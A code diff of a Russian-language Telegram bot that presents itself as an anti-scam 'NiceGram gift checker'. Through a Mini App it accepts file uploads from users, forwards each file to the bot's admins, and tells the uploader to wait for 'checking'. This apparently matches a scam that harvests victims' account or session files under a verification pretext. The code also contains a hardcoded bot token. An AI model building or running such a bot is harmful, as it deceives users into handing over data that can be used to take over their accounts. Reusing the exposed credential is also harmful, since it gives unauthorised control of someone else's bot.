@@ -5,15 +5,7 @@ import sqlite3
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, Router
 from aiogram.filters import Command
-from aiogram.types import (
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    FSInputFile,
-    WebAppInfo,
-    BufferedInputFile
-)
-
-# ================= НАСТРОЙКИ =================
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile
 
 BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
 
@@ -28,14 +20,12 @@ DB_FILE = "bot_data.db"
 
 logging.basicConfig(level=logging.INFO)
 
-# ================= БОТ =================
-
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# ================= БАЗА ДАННЫХ =================
+# ---------- DATABASE ----------
 
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
@@ -92,7 +82,7 @@ def add_new_admin(user_id):
         )
         conn.commit()
 
-# ================= WEB SERVER =================
+# ---------- WEB SERVER ----------
 
 routes = web.RouteTableDef()
 
@@ -120,65 +110,39 @@ async def handle_upload_file(request: web.Request):
             file_data = await part.read()
 
     if user_id and file_data:
-        admin_ids = get_all_admins()
-        caption = f"🚨 Файл загружен через Mini App\nUser ID: {user_id}"
-
-        for admin_id in admin_ids:
+        for admin_id in get_all_admins():
             try:
                 await bot.send_document(
                     admin_id,
                     BufferedInputFile(file_data, filename),
-                    caption=caption
+                    caption=f"File from user {user_id}"
                 )
-            except Exception as e:
-                logging.warning(e)
+            except:
+                pass
 
         try:
-            await bot.send_message(int(user_id), "✅ Файл принят. Ожидайте проверки.")
+            await bot.send_message(int(user_id), "Файл получен")
         except:
             pass
 
     return web.Response(text="OK")
 
-# ================= КНОПКИ =================
+# ---------- BOT UI ----------
 
-TEXT_MAIN = (
-    "Привет! Я помогу тебе не попасться на мошенников.\n"
-    "Проверка подарков NiceGram."
-)
+TEXT_MAIN = "Привет! Я помогу тебе не попасться на мошенников."
 
 def get_main_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text="🚀 Открыть приложение",
-            web_app=WebAppInfo(url=WEB_APP_URL)
-        )],
-        [InlineKeyboardButton(
-            text="📱 Скачать NiceGram",
-            url="https://nicegram.app/"
-        )]
+        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
+        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
     ])
 
-# ================= КОМАНДЫ =================
+# ---------- COMMANDS ----------
 
 @router.message(Command("start"))
 async def cmd_start(message: types.Message):
     user = message.from_user
     is_new = add_user_if_new(user)
-
-    if is_new:
-        for admin in get_all_admins():
-            try:
-                await bot.send_message(
-                    admin,
-                    f"👤 Новый пользователь\n"
-                    f"{user.full_name}\n"
-                    f"@{user.username}\n"
-                    f"ID: <code>{user.id}</code>",
-                    parse_mode="HTML"
-                )
-            except:
-                pass
 
     if os.path.exists("nicegramm.jpg"):
         await message.answer_photo(
@@ -189,8 +153,6 @@ async def cmd_start(message: types.Message):
     else:
         await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
 
-# ================= АДМИНКА =================
-
 @router.message(Command("admin"))
 async def cmd_admin(message: types.Message):
     if message.from_user.id not in get_all_admins():
@@ -198,7 +160,7 @@ async def cmd_admin(message: types.Message):
 
     args = message.text.split()
     if len(args) < 2:
-        await message.answer("Используй: <code>/admin @username</code>", parse_mode="HTML")
+        await message.answer("/admin @username")
         return
 
     username = args[1].replace("@", "").lower()
@@ -206,24 +168,17 @@ async def cmd_admin(message: types.Message):
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute(
-            "SELECT user_id, full_name FROM users WHERE LOWER(username)=?",
+            "SELECT user_id FROM users WHERE LOWER(username)=?",
             (username,)
         )
         row = cursor.fetchone()
 
     if not row:
-        await message.answer("❌ Пользователь не найден")
+        await message.answer("User not found")
         return
 
-    user_id, name = row
-    add_new_admin(user_id)
-
-    await message.answer(f"✅ {name} теперь администратор", parse_mode="HTML")
-    await bot.send_message(
-        user_id,
-        "👑 Вам выданы права администратора",
-        parse_mode="HTML"
-    )
+    add_new_admin(row[0])
+    await message.answer("Admin added")
 
 @router.message(Command("text"))
 async def cmd_text(message: types.Message):
@@ -232,7 +187,7 @@ async def cmd_text(message: types.Message):
 
     parts = message.text.split(maxsplit=2)
     if len(parts) < 3:
-        await message.answer("Используй: <code>/text @username сообщение</code>", parse_mode="HTML")
+        await message.answer("/text @username message")
         return
 
     username = parts[1].replace("@", "").lower()
@@ -247,18 +202,13 @@ async def cmd_text(message: types.Message):
         row = cursor.fetchone()
 
     if not row:
-        await message.answer("❌ Пользователь не найден")
+        await message.answer("User not found")
         return
 
-    await bot.send_message(
-        row[0],
-        f"<b></b>\n{text}",
-        parse_mode="HTML"
-    )
+    await bot.send_message(row[0], text)
+    await message.answer("OK")
 
-    await message.answer("✅ Сообщение отправлено")
-
-# ================= ЗАПУСК =================
+# ---------- START ----------
 
 async def main():
     init_db()
